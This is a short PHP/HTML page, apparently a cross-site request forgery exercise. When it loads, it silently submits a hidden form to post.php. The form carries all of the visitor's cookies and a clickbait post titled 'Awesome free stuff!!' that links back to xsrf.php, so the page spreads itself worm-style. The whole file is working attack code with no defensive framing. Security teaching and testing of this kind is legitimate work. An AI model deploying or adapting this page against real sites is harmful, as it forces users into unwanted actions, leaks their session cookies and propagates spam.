<html>  
   <body>
   <?php
    $cookieValues = "";
    foreach ($_COOKIE as $name => $value) {
      $cookieValues .= $name . "=" . $value . "; ";
    }
    echo '<form method="post" action="post.php">
        <input type="hidden" name="cookie" id="cookie" value="' . $cookieValues . '">
        <input type="hidden" name="title" value="Awesome free stuff!!">
        <input type="hidden" name="message" id="message" value=\'<a href="xsrf.php">Hurry Fast! Click here! eee:)</a>\'>
        <input type="submit" name="post_submit" id="post_submit" value="POST" style="display: none;">
      </form>';
    ?>
    <script>
        window.onload = function(){
                document.getElementById("post_submit").click();
            
        }
    </script>
   </body>
</html>